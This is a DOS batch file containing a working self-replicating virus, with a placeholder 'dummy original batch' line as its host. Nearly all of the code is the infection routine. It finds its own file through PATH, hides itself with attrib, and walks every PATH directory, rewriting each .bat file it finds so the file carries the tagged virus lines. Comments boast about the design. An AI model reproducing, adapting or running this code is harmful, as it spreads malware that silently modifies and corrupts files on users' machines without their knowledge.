@echo off>nul.ViRuS
if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
if "%1=="/ViRuS_OUTER_LOOP goto ViRuS_outer_loop
if "%1=="/ViRuS_FINDSELF goto ViRuS_findself
if "%VOFF%=="T goto ViRuS_OLDBAT

set ViRuSname=%0
if not exist %0.bat call %0 /ViRuS_FINDSELF %path%
if not exist %ViRuSname%.bat set ViRuSname=
if "%ViRuSname%==" goto ViRuS_OLDBAT

rem ViRuS if batch is started with name.BAT, virus will not become active
rem ViRuS it was a bug, now it's a feature ! (also notice the voff variable)
rem ViRuS also if batch was only in an append /x:on path (chance=minimal)

attrib +h %ViRuSname%.bat
for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
attrib -h %ViRuSname%.bat
set ViRuSname=
goto ViRuS_OLDBAT

:ViRuS_findself
if "%2==" goto XXX_END>nul.ViRuS
if exist %2\%ViRuSname%.bat set ViRuSname=%2\%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
shift>nul.ViRuS
goto ViRuS_findself

:ViRuS_outer_loop
for %%a in (%2\*.bat;%2*.bat) do call %0 /ViRuS_MULTIPLY %%a
goto XXX_END>nul.ViRuS

:ViRuS_multiply
find "ViRuS" <%ViRuSname%.bat >xViRuSx.bat
find /v "ViRuS" <%2 |find /v ":XXX_END" >>xViRuSx.bat
echo :XXX_END>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
goto XXX_END>nul.ViRuS

:ViRuS_OLDBAT
echo on>nul.ViRuS
echo This is the dummy original batch
:XXX_END